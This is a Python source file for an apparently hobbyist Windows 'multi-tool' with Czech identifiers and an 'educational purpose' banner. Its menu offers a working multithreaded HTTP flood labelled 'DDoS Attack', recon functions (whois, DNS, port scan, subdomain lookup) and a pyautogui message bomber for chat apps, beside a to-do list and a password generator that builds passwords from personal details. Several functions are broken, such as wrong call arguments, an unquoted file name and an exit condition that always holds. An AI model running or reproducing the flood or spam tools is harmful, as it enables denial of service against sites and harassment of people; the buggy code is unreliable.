import subprocess
import time
import os
import colorama
from colorama import init, Fore, Back, Style
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
import psutil
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume, ISimpleAudioVolume
import winreg
import requests
import threading
import keyboard
import whois
import dns.resolver
from bs4 import BeautifulSoup
import socket
from urllib.parse import urlparse
import pyautogui
import random
import string

def hlavni_cast():
    print("")
    print(Style.RESET_ALL + "╔═════════════════════════════════════════════════════════════════════╗")
    print("║" + Fore.GREEN + "....................................................................." + Style.RESET_ALL + "║")
    print("║" + Fore.BLUE + "....................................................................." + Style.RESET_ALL + "║")
    print("║" + Fore.MAGENTA + "....................................................................." + Style.RESET_ALL + "║")
    print("║" + Fore.CYAN + "....................................................................." + Style.RESET_ALL + "║")
    print("║" + Fore.RED + "............................" + Style.RESET_ALL + "Modern" + Fore.RED + "..................................." + Style.RESET_ALL + "║")
    print("║" + Fore.GREEN + "............................" + Style.RESET_ALL + "Innovative" + Fore.GREEN + "..............................." + Style.RESET_ALL + "║")
    print("║" + Fore.BLUE + "............................" + Style.RESET_ALL + "Knowledgeable" + Fore.BLUE + "............................" + Style.RESET_ALL + "║")
    print("║" + Fore.MAGENTA + "............................" + Style.RESET_ALL + "Unique" + Fore.MAGENTA + "..................................." + Style.RESET_ALL + "║")
    print("║" + Fore.CYAN + "............................" + Style.RESET_ALL + "MIKU" + Fore.CYAN + "....................................." + Style.RESET_ALL + "║")
    print("║" + Fore.RED + ".................." + Style.RESET_ALL + " \U0001F600" + " Only for educational purpose " + "\U0001F600 " + Fore.RED + "..............." + Style.RESET_ALL + "║")
    print("║" + Fore.GREEN + "....................................................................." + Style.RESET_ALL + "║")
    print("║" + Fore.BLUE + "....................................................................." + Style.RESET_ALL + "║")
    print("║" + Fore.MAGENTA + "....................................................................." + Style.RESET_ALL + "║")
    print("║" + Fore.CYAN + "....................................................................." + Style.RESET_ALL + "║")
    print("╠═════════════════════════════════════════════════════════════════════╝")

def nacitani_procenta():
    procenta = 0
    for i in range(0, 101):
        procenta = procenta + 1
        time.sleep(0.01)
        os.system("cls")
        if procenta >= 0 and procenta <= 4.9:
            print(f"[                   ] {procenta}%")
        if procenta >= 5 and procenta <= 9.9:
            print(f"[=                  ] {procenta}%")
        if procenta >= 10 and procenta <= 14.9:
            print(f"[==                 ] {procenta}%")
        if procenta >= 15 and procenta <= 19.9:
            print(f"[===                ] {procenta}%")
        if procenta >= 20 and procenta <= 24.9:
            print(f"[====               ] {procenta}%")
        if procenta >= 25.01 and procenta <= 29.9:
            print(f"[=====              ] {procenta}%")
        if procenta == 25:
            print(f"[=====              ] {procenta}%")
            time.sleep(0.25)
        if procenta >= 30 and procenta <= 34.9:
            print(f"[======             ] {procenta}%")
        if procenta >= 35 and procenta <= 39.9:
            print(f"[=======            ] {procenta}%")
        if procenta >= 40.01 and procenta <= 44.9:
            print(f"[========           ] {procenta}%")
        if procenta == 40:
            print(f"[========           ] {procenta}%")
            time.sleep(0.25)
        if procenta >= 45 and procenta <= 49.9:
            print(f"[=========          ] {procenta}%")
        if procenta >= 50 and procenta <= 54.9:
            print(f"[==========         ] {procenta}%")
        if procenta >= 55 and procenta <= 59.9:
            print(f"[===========        ] {procenta}%")
        if procenta >= 60 and procenta <= 64.9:
            print(f"[============       ] {procenta}%")
        if procenta >= 65 and procenta <= 69.9:
            print(f"[=============      ] {procenta}%")
        if procenta >= 70 and procenta <= 74.9:
            print(f"[==============     ] {procenta}%")
        if procenta >= 75 and procenta <= 79.9:
            print(f"[===============    ] {procenta}%")
        if procenta >= 80.01 and procenta <= 84.9:
            print(f"[================   ] {procenta}%")
        if procenta == 80:
            print(f"[================   ] {procenta}%")
            time.sleep(0.25)
        if procenta >= 85 and procenta <= 89.9:
            print(f"[=================  ] {procenta}%")
        if procenta >= 90 and procenta <= 94.9:
            print(f"[================== ] {procenta}%")
        if procenta >= 95 and procenta <= 99.9:
            print(f"[================== ] {procenta}%")
        if procenta == 100:
            print(f"[===================] {procenta}%")
            time.sleep(0.25)

def vycistit():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")

def nacitani():
    nacteni1 = "...../"
    nacteni2 = ".....-"
    nacteni3 = ".....|"
    print("Loading" + nacteni1)
    time.sleep(0.25)
    vycistit()
    print("Loading" + nacteni2)
    time.sleep(0.25)
    vycistit()
    print("Loading" + nacteni3)
    time.sleep(0.25)
    vycistit()
    print("Loading" + nacteni1)
    time.sleep(0.25)
    vycistit()
    print("Loading" + nacteni2)
    time.sleep(0.25)
    vycistit()
    print("Loading" + nacteni3)
    time.sleep(0.25)
    vycistit()
    print("Loading" + nacteni1)
    time.sleep(0.25)
    vycistit()
    print("Loading" + nacteni2)
    time.sleep(0.25)
    vycistit()
    print("Loading" + nacteni3)
    time.sleep(0.25)
    vycistit()
    print("Loading" + nacteni1)
    time.sleep(0.25)
    vycistit()
    print("Loading" + nacteni2)
    time.sleep(0.25)
    vycistit()
    print("Loading" + nacteni3)
    time.sleep(0.25)
    vycistit()

def volume_up(change):
    increment = change / 100.0
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(
        IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = cast(interface, POINTER(IAudioEndpointVolume))
    current_volume = volume.GetMasterVolumeLevelScalar()
    new_volume = min(current_volume + increment, 1.0)
    volume.SetMasterVolumeLevelScalar(new_volume, None)
    print(f"Volume increased to {new_volume * 100:.0f}%")

def volume_down(change):
    decrement = change / 100.0
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(
        IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = cast(interface, POINTER(IAudioEndpointVolume))
    current_volume = volume.GetMasterVolumeLevelScalar()
    new_volume = max(current_volume - decrement, 0.0)
    volume.SetMasterVolumeLevelScalar(new_volume, None)
    print(f"Volume decreased to {new_volume * 100:.0f}%")

def get_system_volume():
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(
        IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = cast(interface, POINTER(IAudioEndpointVolume))
    current_volume = volume.GetMasterVolumeLevelScalar()
    return current_volume * 100

def get_audio_sessions():
    sessions = AudioUtilities.GetAllSessions()
    audio_info = []
    for session in sessions:
        volume = session._ctl.QueryInterface(ISimpleAudioVolume)
        process = session.Process
        if process:
            process_name = process.name()
            process_id = process.pid
            audio_info.append({
                "process_name": process_name,
                "process_id": process_id,
                "volume": volume.GetMasterVolume() * 100
            })
    return audio_info

def get_installed_apps():
    uninstall_key = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"
    installed_apps = []
    # Získání aplikací nainstalovaných pro všechny uživatele
    with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, uninstall_key) as key:
        for i in range(winreg.QueryInfoKey(key)[0]):
            subkey_name = winreg.EnumKey(key, i)
            with winreg.OpenKey(key, subkey_name) as subkey:
                try:
                    app_name = winreg.QueryValueEx(subkey, "DisplayName")[0]
                    installed_apps.append(app_name)
                except FileNotFoundError:
                    pass
    # Získání aplikací nainstalovaných pro aktuálního uživatele
    with winreg.OpenKey(winreg.HKEY_CURRENT_USER, uninstall_key) as key:
        for i in range(winreg.QueryInfoKey(key)[0]):
            subkey_name = winreg.EnumKey(key, i)
            with winreg.OpenKey(key, subkey_name) as subkey:
                try:
                    app_name = winreg.QueryValueEx(subkey, "DisplayName")[0]
                    installed_apps.append(app_name)
                except FileNotFoundError:
                    pass
    return installed_apps

def send_requests(url):
    global packets_sent
    while not stop_event.is_set():
        try:
            response = requests.get(url)
            packets_sent += 1
            print(f"Request sent! Status code: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Request failed: {e}")

def monitor_input():
    global stop_event
    keyboard.wait('q')
    print("\n'q' detected, stopping attack...")
    stop_event.set()

def ddos_attack(target_url):
    global packets_sent
    packets_sent = 0
    stop_event.clear()
    input_thread = threading.Thread(target=monitor_input)
    input_thread.start()
    threads = []
    for i in range(100):
        thread = threading.Thread(target=send_requests, args=(target_url,))
        threads.append(thread)
        thread.start()
    for thread in threads:
        thread.join()
    print(f"Total packets sent: {packets_sent}")

def get_info_app_music():
    installed_apps = get_installed_apps()
    for app in installed_apps:
        list_aplikace.append(app)
    prave_hraje = get_audio_sessions()
    for pisnicky in prave_hraje:
        list_muzika.append(pisnicky)
    with open('data_aplikace.dat', 'w') as file:
        aplikace = str(list_aplikace)
        file.write(aplikace)
    with open('data_muzika.dat', 'w') as file:
        muzika = str(list_muzika)
        file.write(muzika)

def get_whois_info(domain):
    try:
        whois_info = whois.whois(domain)
        return whois_info
    except Exception as e:
        return str(e)

def get_dns_info(domain):
    dns_info = {}
    try:
        answers = dns.resolver.resolve(domain, 'A')
        dns_info['A'] = [rdata.to_text() for rdata in answers]
    except Exception as e:
        dns_info['A'] = str(e)

    try:
        answers = dns.resolver.resolve(domain, 'MX')
        dns_info['MX'] = [rdata.exchange.to_text() for rdata in answers]
    except Exception as e:
        dns_info['MX'] = str(e)

    try:
        answers = dns.resolver.resolve(domain, 'NS')
        dns_info['NS'] = [rdata.to_text() for rdata in answers]
    except Exception as e:
        dns_info['NS'] = str(e)

    return dns_info

def get_open_ports(domain):
    open_ports = []
    common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 8080, 8443]
    for port in common_ports:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        try:
            result = sock.connect_ex((domain, port))
            if result == 0:
                open_ports.append(port)
        except Exception as e:
            pass
        finally:
            sock.close()
    return open_ports

def get_website_info(url):
    website_info = {}
    try:
        response = requests.get(url)
        website_info['status_code'] = response.status_code
        website_info['headers'] = response.headers
        soup = BeautifulSoup(response.content, 'html.parser')
        website_info['title'] = soup.title.string if soup.title else 'No title found'
        website_info['meta_description'] = soup.find('meta', attrs={'name': 'description'})
        if website_info['meta_description']:
            website_info['meta_description'] = website_info['meta_description'].get('content', 'No description content')
        else:
            website_info['meta_description'] = 'No meta description found'
    except Exception as e:
        website_info['error'] = str(e)
    return website_info

def gather_information(url):
    parsed_url = urlparse(url)
    domain = parsed_url.netloc or parsed_url.path
    print(f"Gathering information for domain: {domain}\n")
    print("WHOIS Information:")
    whois_info = get_whois_info(domain)
    print(whois_info)
    print("\nDNS Information:")
    dns_info = get_dns_info(domain)
    for record_type, records in dns_info.items():
        print(f"{record_type} Records: {records}")
    print("\nOpen Ports:")
    open_ports = get_open_ports(domain)
    print(open_ports)
    print("\nWebsite Information:")
    website_info = get_website_info(url)
    for key, value in website_info.items():
        print(f"{key}: {value}")

def bombarduj(zprava, kolikrat):
    time.sleep(3)
    zprava = zprava
    kolikrat = kolikrat
    for i in range(kolikrat):
        pyautogui.write(zprava)
        pyautogui.sleep(0.25)
        pyautogui.press('enter')
        time.sleep(0.25)

def nacti_ukoly():
    if os.path.exists(filename):
        with open(filename, 'r') as file:
            return [line.strip() for line in file.readlines()]
    return []

def uloz_ukoly(ukoly):
    with open(filename, 'w') as file:
        for ukol in ukoly:
            file.write(ukol + '\n')

def pridat_ukol():
    novy_ukol = input("Zadej nový úkol: ")
    ukoly.append(str(len(ukoly) + 1) + ". " + novy_ukol)
    uloz_ukoly(ukoly)
    print("\nNový úkol byl přidán.")
    time.sleep(2)
    vycistit()

def vypis_ukoly():
    print("Seznam úkolů:\n")
    for ukol in ukoly:
        print(ukol)
        print("")
        time.sleep(0.5)

def oznacit_hotovy_ukol():
    cislo_ukolu = int(input("Zadej číslo úkolu, který chceš označit jako hotový: "))
    if cislo_ukolu > 0 and cislo_ukolu <= len(ukoly):
        ukoly[cislo_ukolu - 1] += "    (hotovo)"
        uloz_ukoly(ukoly)
        print(f"Úkol {cislo_ukolu} byl označen jako hotový.")
    else:
        print("Zadané číslo úkolu není platné.")
    time.sleep(2)
    vycistit()

def sprava_ukolu():
    while True:
        vycistit()
        print("\n {1.}  Přidat úkol")
        print("\n {2.}  Označit úkol jako hotový")
        print("\n {3.}  Vypsat úkoly")
        print("\n {4.}  Konec\n")
        volba = input("Vyber akci: ").lower()
        if volba == '1':
            pridat_ukol()
        elif volba == '2':
            oznacit_hotovy_ukol()
        elif volba == '3':
            vypis_ukoly()
            input("\nStiskněte Enter pro návrat do menu...")
        elif volba == '4':
            break
        else:
            print("Neplatná volba.")
            time.sleep(2)

def execute_command():
    subprocess.call(["Install.cmd"], cwd="./Mr.Holmes-master")

def generate_password():
    pet_name = input("Zadejte jméno domácího zvířete: ")
    phone_number = input("Zadejte číslo mobilního telefonu: ")
    important_date = input("Zadejte důležité datum ve formátu den.měsíc.rok: ")
    favorite_word = input("Zadejte své oblíbené slovo: ")
    date_parts = important_date.split('.')
    day = date_parts[0]
    month = date_parts[1]
    year = date_parts[2]
    base_password = pet_name + phone_number[-4:] + day + favorite_word + year[-2:] + month
    special_characters = string.punctuation
    base_password += random.choice(special_characters)
    password_list = list(base_password)
    random.shuffle(password_list)
    final_password = ''.join(password_list)
    return final_password

def generate_password_list(pet_name, phone_number, important_date, favorite_word):
    date_parts = important_date.split('.')
    day = date_parts[0]
    month = date_parts[1]
    year = date_parts[2]
    base_password = pet_name + phone_number[-4:] + day + favorite_word + year[-2:] + month
    special_characters = string.punctuation
    base_password += random.choice(special_characters)
    password_list = list(base_password)
    random.shuffle(password_list)
    final_password = ''.join(password_list)
    return final_password

def generate_multiple_passwords(num_passwords, pet_name, phone_number, important_date, favorite_word):
    passwords = []
    for _ in range(num_passwords):
        passwords.append(generate_password(pet_name, phone_number, important_date, favorite_word))
    return passwords

def save_passwords_to_file(passwords, filename):
    with open(filename, 'w') as file:
        for password in passwords:
            file.write(password + '\n')

def get_subdomains(domain):
    subdomains = set()
    try:
        url = f"https://crt.sh/?q=%25.{domain}&output=json"
        response = requests.get(url)
        if response.status_code == 200:
            data = response.json()
            for entry in data:
                subdomains.update(entry['name_value'].split('\n'))
        else:
            print(f"Failed to fetch subdomains for {domain}. Status code: {response.status_code}")
    except Exception as e:
        print(f"An error occurred: {str(e)}")
    return list(subdomains)

def uloz(data, nazev):
    data = data
    nazev = nazev
    with open(nazev, 'w') as file:
        data = str(data)
        file.write(data)

def zobraz_data(nazev):
    nazev = nazev
    with open(nazev, 'r') as file:
        data = file.read()
    return data

def hlavni_volby():
    print("╠═ 1.) DDoS Attack")
    print("╠═ 2.) Information Gathering")
    print("╠═ 3.) Message bombarding")
    print("╠═ 4.) Manage your goal list")
    print("╠═ 5.) Generate password")
    print("╠═ 6.) Generate password list")
    print("╠═ 7.) Get info about installed application and actual music")
    print("╠═ 8.) Notepad")
    print("╠═ 9.) Get subdomains by web")
    print("╠═ 10.) ")
    print("╠═ 11.) ")
    print("╠═ 12.) ")
    print("╠═ 13.) ")
    print("╠═ 14.) ")
    print("╠═ 15.) ")
    print("╠═ 16.) ")
    print("╠═ 17.) ")
    print("╠═ 18.) ")
    print("╠═ 19.) ")
    print("╠═ 20.) ")
    print("╠═ 21.) ")
    print("╠═ 22.) ")
    print("╠═ 23.) ")
    print("╠═ 24.) ")
    print("╠═ 25.) ")
    print("╠═ 26.) ")
    print("╠═ 27.) ")
    print("╠═ 28.) ")
    print("╠═ 29.) Download all packages for proper operation")
    print("╠═ 00.) ")
    print("╠═ Select a number: ")

def volby(cislo):
    volba = cislo
    if volba == 1:
        print("╠═ What web do you prefer to start attack on it? ")
        web = input("╚════> ")
        web = "https://" + web
        print("For stop the attack, then press 'q'")
        time.sleep(2)
        ddos_attack(web)
    elif volba == 2:
        print("╠═ What web do you prefer to gather information? ")
        web = input("╚════> ")
        web = "https://" + web
        time.sleep(2)
        gather_information(web)
    elif volba == 3:
        print("╠═ After the bombardment starts, just turn on Whatsapp, Instagram or another messaging app and hover over the message box. ")
        print("╠═ You will then see how your message is automatically written and sent.")
        zprava = input("╠═════> What message do you like to send?: ")
        print("╠═ How many times do you want to send a message?")
        kolikrat = int(input("╠═════> How many times do you want to send a message?: "))
        print("╠═ Open application and wait 3 second.")
        print("╚═════════════════════════════════════════════════════════════════>")
        bombarduj(zprava, kolikrat)
    elif volba == 4:
        print("Starting...")
        nacitani_procenta()
        sprava_ukolu()
    elif volba == 5:
        print("Starting...")
        nacitani_procenta()
        heslo = generate_password()
        print(f"Here is your strenght password that you can use to your emails or others: {heslo}")
    elif volba == 6:
        print("╠═ Write down your name: ")
        pet_name = input("╚════> ")
        print("╠═ Write down your phone number: ")
        phone_number = input("╚════> ")
        print("╠═ Write date in format DD/MM/YYYY: ")
        important_date = input("╚════> ")
        print("╠═ Write down your favourite word: ")
        favorite_word = input("╚════> ")
        print("╠═ How many password can I make?")
        num_passwords = int(input("╚════> "))
        passwords = generate_multiple_passwords(num_passwords, pet_name, phone_number, important_date, favorite_word)
        save_passwords_to_file(passwords, 'password_list.txt')
        print("Your password are saved into 'password_list.txt'")
    elif volba == 7:
        print("Getting info about installed application and current music...")
        time.sleep(1)
        nacitani_procenta()
        get_info_app_music()
        print("Info has been written to the file")
    elif volba == 8:
        print("Starting...")
        time.sleep(1)
        print("╠═ Do you want to write(1) or read(2) from the file?")
        volba = int(input("╠═════> "))
        if volba == 1:
            print("Write down what you want to save to the text file")
            text = input()
            uloz(text, notepad.txt)
            print("your data is saved")
        elif volba == 2:
            print("Reading data...")
            time.sleep(0.25)
            print("Your data is writted down:")
            print("")
            data = zobraz_data(notepad.txt)
            print(data)
    elif volba == 9:
        print("╠═ Write down URL: ")
        web = input("╚════> ")
        subdomains = get_subdomains(web)
        print("Subdomains:")
        for subdomain in subdomains:
            print(subdomain)



    elif volba == 29:
        execute_command()
    elif volba == 0 or 00:
        exit()
    else:
        print("!Error in selecting number!")


filename = "tasks.txt"
ukoly = nacti_ukoly()
list_aplikace = []
list_muzika = []
ukoly = []
packets_sent = 0
stop_event = threading.Event()

while True:
    hlavni_cast()
    time.sleep(1)
    hlavni_volby()
    volba = int(input("╠═════> "))
    volby(volba)
